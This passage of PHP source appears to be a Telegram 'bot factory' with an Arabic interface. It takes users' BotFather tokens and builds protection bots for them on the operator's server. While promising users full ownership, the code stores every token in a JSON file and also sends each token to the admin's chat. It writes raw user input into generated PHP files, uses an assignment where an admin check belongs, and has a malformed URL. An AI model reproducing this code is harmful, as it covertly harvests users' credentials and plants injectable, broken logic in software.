$SAIEDZip11=array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
$SAIEDZip12=floor((strlen($SAIEDZip9) - 1) / 3);
return sprintf("%.{$SAIEDZip10}f", $SAIEDZip9 / pow(1024, $SAIEDZip12)) . @$SAIEDZip11[$SAIEDZip12];
}
$SAIEDZip15 = json_decode(file_get_contents('php://input'));
$SAIEDZip16 = $SAIEDZip15->message;
$SAIEDZip17 = $SAIEDZip16->text;
$SAIEDZip18 = $SAIEDZip16->message_id;
if($SAIEDZip17 == "📁┇› نسخة احتياطية" and $from_id = $admin){
$RSAIED = "$admin";
date_default_timezone_set("Asia/Damascus");
$SAIEDZip13 = date("{h-i-s}");
SAIEDZip('',"Backup-$SAIEDZip13.zip");
bot('senddocument',[
'chat_id'=>$RSAIED,
'document'=>"https://$g/Backup-$SAIEDZip13.zip",
'caption'=>"Backup. 📦
Today's date : ".date('Y/m/d')." 📆
The Time is : ".date('h:i A')." ⏰
File size : ".SAIEDZip1(filesize("Backup-$SAIEDZip13.zip"))." 🏷",
'reply_to_message_id'=>$SAIEDZip18,
]);
unlink("Backup-$SAIEDZip13.zip");
}
//»»»»»»»»»»»»»»»»»»
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$name = $message->from->first_name;
$username = $message->from->username;
$chat_id = $message->chat->id;
$text = $message->text;
$from_id = $message->from->id;
$tkk = json_decode(file_get_contents('tkk.json'),true);
date_default_timezone_set('Asia/Riyadh');
$date = date('h:i:s'); $d = date('A');
$aa =preg_replace('/AM/', 'ص', $d);$aa =preg_replace('/PM/', 'م', $d);
 
$update = json_decode(file_get_contents('php://input'));
$message = $update->message; $chat_id = $message->chat->id;
$from_id = $message->from->id; $name = $message->from->first_name; $text = $message->text;
$mid = $message->message_id; $name2 = $update->callback_query->from->first_name; $message_id2 = $update->callback_query->message->message_id; $chat_id2 = $update->callback_query->message->chat->id;
$from_id2 = $update->callback_query->from->id; $message_id = $update->callback_query->message->message_id; $data = $update->callback_query->data;
$info_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); $info_tokens = json_decode($info_token);
$get_files = file_get_contents('yhya.php'); $get_done = file_get_contents('infos/explode.php');
$done = explode("\n", $get_done);
$get_id = file_get_contents('infos/yhyahloobotsyria.txt'); $get_ids = explode("\n", $get_id);
$from_id = $message->from->id;
mkdir("infos");
mkdir("geme");
//======================================================//
$index="<html>
<meta HTTP-EQUIV='REFRESH' content='0; url=https://t.me/II_Q_LL'/>
</html>";
$urls="https://alivrx.tk/nizk";//http://vzhsbd.ml
//»»»»»»»»»»»»»»»»»»
if($text == '/start' and !in_array($from_id, $get_ids)){
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👨‍✈️ ⁞ مرحبا بك *[$name](tg://user?id=$from_id)* ؛ 
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
🙋🏻‍♂╿في بوت مـــصـــنع كــروز  لحماية 
🎫│يـمـكـنـك الان صـنـع بـوتـآت حمـآيهہ
👨‍💻│بـكـامل حـقـوقـك انت المطور الاساسي
♨️│ســرعـة خـيـاليه ضـمـان عدم التـوقـف
🛠╽اضغط على الازرار بالاسفل للتحكم
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
,          DEV: @llIIlIIllI
",'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⌔∮ ⪼ صنع بوت','callback_data'=>'addbot'],['text'=>'🗑┊› احذف بوتك الان','callback_data'=>'delete']],
[['text'=>'⌔∮ ⪼ ستوريات','url'=>'https://t.me/ii_Q_LL']],
[['text'=>'⌔∮ ⪼ كيف صنع بوت','callback_data'=>'help'],['text'=>'🖲┊› تحديث البوت', 'callback_data'=>"hkt"]],
[['text'=>'⌔∮ ⪼ المطور','url'=>'https://t.me/llIIlIIllI']],],])]);}
if($data == 'addbot' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){file_put_contents('infos/yhyahloobotsyria.txt', "\n" . $chat_id2 . "\n",FILE_APPEND); bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"*
👨‍✈️┊› مرحبا عزيزي *[المشترك](tg://user?id=$from_id)*
🛠┊› قم بارسال التوكن الخاص بك الان؛
🌈┊› قم بانشائة الان من بوت *@BotFather* ؛
√*
",'parse_mode'=>"markdown",
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🔄┊› العودة','callback_data'=>'cancle']]]])]);}

if($data == 'addbot' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
file_put_contents('infos/yhyahloobotsyria.txt', "\n" . $chat_id2 . "\n",FILE_APPEND); 
bot('editMessageText',
['chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*👨‍✈️┊› مرحبا عزيزي *[المشترك](tg://user?id=$from_id)*
🛠┊› قم بارسال التوكن الخاص بك الان؛
🌈┊› قم بانشائة الان من بوت *@BotFather ؛*
√*
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'🔄┊› العـودة','callback_data'=>'cancle']]]])]);}

if($data == 'addbot' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,
'text'=>"
👨‍✈️┊› عدرا عزيزي $name
🛠┊› لايمكنك انشاء اكثر من بوت واحد ؛
🌈┊› يمكنك انشاء البوت من حساب اخر ؛
",'show_alert'=>true]);}
if($text and in_array($from_id, $get_ids) and $info_tokens->ok == "true" ){
    if($info_tokens->ok == "true"){
for($i = $mid - 3; $i < $mid; $i++){bot('deleteMessage',[
'chat_id'=>$chat_id,'message_id'=>$i]);}
$str = str_replace($from_id, '', $get_id);    
file_put_contents('infos/yhyahloobotsyria.txt', $str);    
file_put_contents('infos/explode.php', $from_id . "\n", FILE_APPEND);
$url_info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$json_info = json_decode($url_info);
$userr = $json_info->result->username;
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"*
🎭 ⁞ مرحبا بك عزيزي *[المطور](tg://user?id=$from_id)*👨‍✈️ ؛
🔅 ⁞ مبروك تم إنشاء البوت الخاص بنجاح ؛
🤖 ⁞ للدخول إلى البوت الخاص بك *[اضغـط هنا](t.me/$userr)* ؛
*",'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'👾┊› اضغط هنا لدخول الئ بوتك','url'=>"https://t.me/$userr"]],
[['text'=>'🏠️┊› الصفحة الرئيسية','callback_data'=>"home"]],
]])]); 
bot('sendMessage',['chat_id'=>$admin,'text'=>"*
👋┊› مرحبا بك عزيزي المطور ؛
👤┊›  هناك عضوا قام بانشاء بوت ؛
🔘┊› هذه معلومات العضو والبوت ادناه ؛ 
ـ┄─━━━━━━━─┄
👮‍♂┊›  العضو ~⪼❪ *[$name](tg://user?id=$from_id)* ❫ ؛
🎫┊›  الايديـ ~⪼❪ *`$chat_id`* ❫ ؛
🎟┊›  المعرف ~⪼❪ *[@$username](tg://user?id=$from_id)* ❫ ؛
👾┊›  معرف البوت~⪼❪ *@$userr* ❫ ؛
⏰┊›  الوقت ~⪼❪ *$date $aaa* ❫ ؛
🤖┊›  التوكن الخاص للبوت ~⪼
- *`$text`* ؛
➺*
",'disable_web_page_preview'=>'true',
'parse_mode'=>"Markdown",]);
mkdir("geme/$from_id");
$yhyanesb_sy = '<?php $yhya_id = "'.$from_id.'"; $tk = "'.$text.'"; ?>';
file_put_contents("geme/$from_id/Ali.php","$yhyanesb_sy \n $get_files");
file_put_contents("info.txt",$from_id ."\n",FILE_APPEND);
file_put_contents("geme/$from_id/chat.php", $from_id . "\n");
file_put_contents("geme/$from_id/index.html","$index");
file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=$urls/geme/$from_id/Ali.php");
    $tkk[$from_id] = ($tkk[$from_id]=$text);
    file_put_contents('tkk.json',json_encode($tkk));
file_put_contents("geme/index.html","$index");
file_put_contents("zreaf/	geme/$from_id","$index");
}else{
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"- عذراً❗️هاذا التوكن غير صالح ⚠️ ؛",'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'inline_keyboard'=>[[['text'=>'🔄┊› العـودة','callback_data'=>'cancle']]]])]);}}
if($data == 'cancle' and in_array($from_id, $get_ids)){
$str = str_replace($chat_id2, "", $get_id) ;
file_put_contents('infos/yhyahloobotsyria.txt', $str);
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
👨‍✈️ ⁞ مرحبا بك *[$name](tg://user?id=$from_id)* ؛ 
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
🙋🏻‍♂╿في بوت مـــصـــنع كــروز  لحماية 
🎫│يـمـكـنـك الان صـنـع بـوتـآت حمـآيهہ
👨‍💻│بـكـامل حـقـوقـك انت المطور الاساسي
♨️│ســرعـة خـيـاليه ضـمـان عدم التـوقـف
🛠╽اضغط على الازرار بالاسفل للتحكم
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
,          DEV: @llIIlIIllI
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⌔∮ ⪼ صنع بوت','callback_data'=>'addbot'],['text'=>'⌔∮ ⪼ حذف البوت','callback_data'=>'delete']],
[['text'=>'⌔∮ ⪼ ستوريات','url'=>'https://t.me/II_Q_LL']],
[['text'=>'⌔∮ ⪼ كيف صنع بوت','callback_data'=>'help'],['text'=>'⌔∮ ⪼ تحديث البوت', 'callback_data'=>"hkt"]],
[['text'=>'⌔∮ ⪼ المطور','url'=>'https://t.me/llIIlIIllI']],],])]);}
if($data == 'home'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"*
👨‍✈️ ⁞ مرحبا بك *[$name](tg://user?id=$from_id)* ؛ 
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
🙋🏻‍♂╿في بوت مـــصـــنع كــروز  لحماية 
🎫│يـمـكـنـك الان صـنـع بـوتـآت حمـآيهہ
👨‍💻│بـكـامل حـقـوقـك انت المطور الاساسي
♨️│ســرعـة خـيـاليه ضـمـان عدم التـوقـف
🛠╽اضغط على الازرار بالاسفل للتحكم
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
,          DEV: @llIIlIIllI
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⌔∮ ⪼ صنع بوت','callback_data'=>'addbot'],['text'=>'⌔∮ ⪼ حذف البوت','callback_data'=>'delete']],
[['text'=>'⌔∮ ⪼ ستوريات','url'=>'https://t.me/II_Q_LL']],
[['text'=>'⌔∮ ⪼ كيف صنع بوت','callback_data'=>'help'],['text'=>'⌔∮ ⪼ تحديث البوت', 'callback_data'=>"hkt"]],
[['text'=>'⌔∮ ⪼ المطور','url'=>'https://t.me/llIIlIIllI']],],])]);}
if($data == 'help'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
**🎭┊› مرحبا بك *$sub* 👨‍✈️؛
♨️┊› انتبه للخطوات التالية ادناه↯
🚸┊› لمعرفة إنشاء توكن خاص بك↯ 
ـ┄─━━━━━━━─┄
🤖┊› اذهب الى بوت فاذر @BotFather ؛
⛓┊› ارسل له الامر */start* ثم */newbot* ؛
📝┊› اكتب اسم البوت الذي تريد ❪عربي - انكليزي❫ ؛
🔖┊› اكتب المعرف الذي تريد بدون @ وينتهي بكلمة؛ 
🗄┊› كالتالي *bot* او *bot_* مثلا *Alibot* ؛
🔘┊› انتظر قليلا ويعطيك التوكن في رسالة ؛
🖇┊› فقط انسخ التوكن اسفل الرسالة كالتالي:- ↯ 
❪ **`1155724332:AAGbhHv108lRhlGSkMupKcbQcCjZpYMqVDU`** ❫
┄─━━━━━━━─┄
ستوريات ⌔∮ ⪼ @II_Q_LL
المطور ⌔∮ ⪼ @llIIlIIllI    
⏰┊› ـ ❪ $date $aa ❫
▁**
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🏠️┊› الصفحة الرئيسية','callback_data'=>'home']],[['text'=>'📟┊› تابع قناة البوت العامة','url'=>'https://t.me/thtss']],],])]);}
//============================//
if($data == 'delete' and in_array($chat_id2,$done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>'*
👨‍✈️┊› مرحبا بك عزيزي *[المنشى](tg://user?id=$from_id)* ؛
🛠┊› هل انت متاكد الان من حذف بوتك الخاص ؛
🌈┊› سيتم حذفه بعد اختيار الامر نعم بالتاكيد ؛
 ➺*
','parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🔄┊› العـودة', 'callback_data'=>'home'],['text'=>'✔️ - نعم بالتأكيد -','callback_data'=>'yesdel'],]]])]);}
if($data == 'yesdel' and in_array($chat_id2, $done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
👨‍✈️┊› مرحبا عزيزي $name
🛠┊› تم حذف البوت الخاص بك ؛
🌈┊› يمكنك الانشاء باي وقت تريده ؛
 ➺",
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🏠️┊› الصفحة الرئيسية','callback_data'=>"home"]]]])]);
$str1 = str_replace($chat_id2, '', $get_done);
file_put_contents('infos/explode.php', $str1);
$get_token = $tkk[$from_id];
$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");
$json = json_decode($get_url);
$url = $json->result->url;
file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");
unlink("geme/$chat_id2/Ali.php");
}
if($data == 'delete' and !in_array($chat_id2,$done)){bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"
👨‍✈️┊› عذرا عزيزي المشترك
➲┊› قم بانشاء البوت الخاص بك  ؛
🌈┊› يمكنك انشائه من بوت @BotFather ؛
",'show_alert'=>true]);}
echo "Errors No found";
$get_ids = file_get_contents('info.txt');
$ids = explode("\n", $get_ids);
$get_bc = file_get_contents('bc.txt');
$bc = explode("\n", $get_bc);
$count = count($ids);
//************//
if($data == "hkt"){
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
⌔∮ ⪼ عزيزي المشترك
⌔∮ ⪼ انت تمتلك احدث
⌔∮ ⪼ نسخه من السورس

",
'show_alert'=>true
]);
}
$alshh3 = file_get_contents("Alsh.txt");
$member_id = explode("\n",$alshh3);
if($text == "تحديث" or $text == "🤖┇› تحديث البوتات" and $from_id == $sudo){
foreach(scandir('geme/') as $f2){
if($f2 != '.' and $f2 != '..'){
unlink("geme/$f2/Ali.php");
$ckkkk = file_get_contents('yhya.php');
$yhyanesb_sy1 = '<?php $yhya_id = "'.$f2.'"; $tk = "'.$tkk[$f2].'"; ?>';
file_put_contents("geme/$f2/Ali.php","$yhyanesb_sy1 $ckkkk"); 
}}
bot('SendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"*🛠┊› تم تحديث البوتات بنجاح √؛ 
ـ┄─━━━━━━━─┄
📟┊› عدد البوتات المصنوعة ◄❨ *$count* ❩-؛
👥┊› عدد المشترڪين ◄❨ *$memberscount* ❩-؛
⏰┊› الوقت ◄❨ $date $aa ❩-؛
➺*
",'parse_mode'=>"MARKDOWN",
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}
//»»»»»»»»»»»»»»»»»»
if($from_id == $sudo){
if($text == "الاحصائيات" || $text == "📊┇› الاحصائيات"){
bot("SendMessage",[
'chat_id'=>$chat_id,
'text'=>"الاحصائيات : 🔰 
ـ┄─━━━━━━━─┄
*📟┇› عدد البوتات المصنوعة ◄❨ $count ❩-؛
👥┇› عدد المشترڪين ◄❨ $memberscount ❩-؛
⏰┇› الوقت ◄❨ $date $aa ❩-؛
➺*
",'parse_mode'=>"MARKDOWN",
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}}
$tilitet = "🌐 شارك البوت لغيرک";
$index = "<h2>@llIIlIIllI</link>";
bot('answerInlineQuery',[
        'inline_query_id'=>$update->inline_query->id,    
        'results' => json_encode([[
            'type'=>'article',
            'id'=>base64_encode(rand(5,555)),
            'title'=>'اضغط هنا للنشر ',
            'input_message_content'=>['parse_mode'=>'HTML','message_text'=>"
👨‍✈️ ⁞ مرحبا بك *[$name](tg://user?id=$from_id)* ؛ 
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
🙋🏻‍♂╿في بوت مـــصـــنع كــروز  لحماية 
🎫│يـمـكـنـك الان صـنـع بـوتـآت حمـآيهہ
👨‍💻│بـكـامل حـقـوقـك انت المطور الاساسي
♨️│ســرعـة خـيـاليه ضـمـان عدم التـوقـف
🛠╽اضغط على الازرار بالاسفل للتحكم
✧ ▬▭ ▬▭ ✦✧✦ ▭▬ ▭▬ ✧
,          DEV: @llIIlIIllI
"],
            'reply_markup'=>['inline_keyboard'=>[
                [
                ['text'=>"🛠 اصنع بوتك مجانا",'url'=>'https://telegram.me/CROZ_BOT?start']
               ], 
                [['text'=>"$tilitet", 'switch_inline_query'=>"$from_id"]], 
             ]]
        ]])
    ]);
//»»»»»»»»»»»»»»»»»»

